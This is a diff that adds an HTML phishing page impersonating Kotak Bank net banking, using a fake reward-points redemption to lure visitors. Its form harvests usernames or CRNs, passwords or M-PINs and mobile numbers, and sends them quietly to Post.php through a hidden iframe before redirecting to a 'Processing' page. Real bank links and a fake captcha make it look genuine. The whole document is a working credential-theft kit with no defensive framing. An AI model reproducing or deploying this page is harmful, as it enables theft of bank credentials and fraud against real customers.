@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Kotak Bank Reward | Redeem</title>
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="author" content="Syahrizaldev">
+<title></title>
+<link rel="stylesheet" href="./style.css">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Heebo:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style type="text/css">
+#Lg
+{
+  width:180px;
+  margin-bottom:10px;
+  margin-top:25px;
+}
+#Lg2
+{
+  width:155px;
+  position:absolute;
+  margin-top:0%;
+  margin-left:40%;
+  margin-top:24px;
+}
+
+div.c
+{
+    line-height: 160%;
+    font-size:16px; 
+    font-family: 'Heebo', sans-serif; 
+    font-weight:300;  
+    margin-top:0;
+}
+div.footer
+{
+    line-height: 90%;
+}
+
+#captcha
+{
+  width:143.4px;
+  height:35px;
+  font-size:14px;
+  font-family: 'Heebo', sans-serif;
+  border-style:solid;
+  border-color:black;
+  border-width:1px;
+  border-radius:4px;
+  outline:none;
+  padding:0 10px;
+  text-transform:none;
+}
+.btn
+{
+  width:120px;
+  padding:10px 10px;
+  border-style:solid;
+  outline:none;
+  border:none;
+  border-radius:4px;
+  color:#fff;
+  font-family: 'Heebo', sans-serif;
+  font-weight:600;
+  font-size:15px;
+  background-color:#EE1C25;
+  margin-top:15px;
+  margin-left:55%;
+}
+hr.hr
+{
+  width:116%;
+  margin-left:-8%;
+  border-style:solid;
+  border-color:grey;
+  border-width:0.5px;
+  }
+  
+.checkbox-wrapper-46 input[type="checkbox"] {
+  display: none;
+  visibility: hidden;
+}
+
+.checkbox-wrapper-46 .cbx {
+  margin: auto;
+  -webkit-user-select: none;
+  user-select: none;
+  cursor: pointer;
+}
+.checkbox-wrapper-46 .cbx span {
+  display: inline-block;
+  vertical-align: middle;
+  transform: translate3d(0, 0, 0);
+}
+.checkbox-wrapper-46 .cbx span:first-child {
+  position: relative;
+  width: 16px;
+  height: 16px;
+  border-radius: 2px;
+  transform: scale(1);
+  vertical-align: middle;
+  border: 1px solid grey;
+  transition: all 0.3s ease;
+}
+.checkbox-wrapper-46 .cbx span:first-child svg {
+  position: absolute;
+  top: 2px;
+  left: 1px;
+  fill: none;
+  stroke: #FFFFFF;
+  stroke-width: 0.75;
+  stroke-linecap: round;
+  stroke-linejoin: round;
+  stroke-dasharray: 16px;
+  stroke-dashoffset: 16px;
+  transition: all 0.3s ease;
+  transition-delay: 0.1s;
+  transform: translate3d(0, 0, 0);
+}
+.checkbox-wrapper-46 .cbx span:first-child:before {
+  content: "";
+  width: 100%;
+  height: 100%;
+  background: #0070e0;
+  display: block;
+  transform: scale(0);
+  opacity: 1;
+  border-radius: 50%;
+}
+.checkbox-wrapper-46 .cbx span:last-child {
+  padding-left: 10px;
+}
+.checkbox-wrapper-46 .cbx:hover span:first-child {
+  border-color: grey;
+}
+
+.checkbox-wrapper-46 .inp-cbx:checked + .cbx span:first-child {
+  background: #0070e0;
+  border-color: #0070e0;
+  animation: wave-46 0.4s ease;
+}
+.checkbox-wrapper-46 .inp-cbx:checked + .cbx span:first-child svg {
+  stroke-dashoffset: 0;
+}
+.checkbox-wrapper-46 .inp-cbx:checked + .cbx span:first-child:before {
+  transform: scale(3.5);
+  opacity: 0;
+  transition: all 0.6s ease;
+}
+
+@keyframes wave-46 {
+  50% {
+    transform: scale(0.9);
+  }
+}
+</style>
+</head>
+<body>
+<!-- Static- Please don't do anything here-->
+  <script type="text/javascript">var submitted=false;</script>
+  <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Processing.html';}"></iframe>
+<!-- partial:index.partial.html -->
+<section class="sectioncontact-section" style="background-color:#FAFAFA;">
+	<div class="container contact-column">
+		<img src="Kotak_Logo.jpg" alt="" id="Lg" >
+		<form class="contact-inform form" action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true">
+		    <div class="c">
+		    <h2>Login with Kotak Bank<br> Net Banking</h3>
+			</div><br>
+			<div style="margin-top:-15px;">
+			<p1 style="color:#000; font-size:15px; font-family: 'Heebo', sans-serif; font-weight:500;">₹ Redeem Kotak Bank Reward Points.</p1><br><br>
+			</div>
+			<div class="form-control" style="margin-top:-5px;">
+				<input type="text" name="CRN/UserName" class="form-input" placeholder="Enter Your CRN Or Username to begin" minlength="6" maxlength="25" required="">
+				<label for="CRN" class="form-label">Enter Your CRN Or Username</label>
+			</div>
+			<div class="form-control">
+				<input type="password" name="MPIN_Password" class="form-input" placeholder="Enter Your Password/ M-PIN" minlength="6" maxlength="25" required="">
+				<label for="email" class="form-label">Password/ M-PIN</label>
+			</div>
+			<div class="form-control">
+				<input type="text" name="Mobile_No." inputmode="numeric" class="form-input" placeholder="Enter registered number" maxlength="10"
+				pattern="[6-9]\d{9}" title="Please enter valid mobile number !" required="">
+				<label for="password" class="form-label">Registered Mobile Number</label>
+			</div>
+			<div style="margin-top:-20px;" class="checkbox-wrapper-46">
+			<input class="inp-cbx" id="cbx-46" type="checkbox" />
+			<label class="cbx" for="cbx-46"><span>
+			<svg width="12px" height="10px" viewbox="0 0 12 10">
+			<polyline points="1.5 6 4.5 9 10.5 1"></polyline>
+			</svg></span><span style="font-size:13px;">Remember me</span>
+			</label>
+			</div>
+			<img src="Captcha.jpg" alt="" id="Lg2" >
+			<div class="n-form">
+			<p1 style="color:#000; font-size:13px; font-weight:400; ">Enter Captcha</p1><br>
+			<input type="text" name="" id="captcha"  placeholder="Enter Captcha" maxlength="5"
+		    pattern="GHMTE" title="Please enter correct captcha !" required="">
+			</div><br>
+			<div class="footer">
+			<p1 style="color:grey; font-size:12px; font-family: 'Heebo', sans-serif; font-weight:500;">By clicking on 'Next', You accept that you have read our
+			<a style="color:grey; font-size:12px; font-family: 'Heebo', sans-serif; font-weight:500; text-decoration: underline;" href="https://www.kotak.com/en/customer-service/terms-and-conditions.html#1"> Terms and conditions ,</a>
+			<a style="color:grey; font-size:12px; font-family: 'Heebo', sans-serif; font-weight:500; text-decoration: underline;" href="https://www.kotak.com/en/privacy-policy.html">Privacy Policy</a> and the<br>
+			<a style="color:grey; font-size:12px; font-family: 'Heebo', sans-serif; font-weight:500; text-decoration: underline;" href="#" >Tips for Safe Banking</a>
+			</p1>
+			</div><br>
+			<hr class="hr">
+			<button type="submit" class="btn">Next</button>
+</section>
+</body>
+</html>
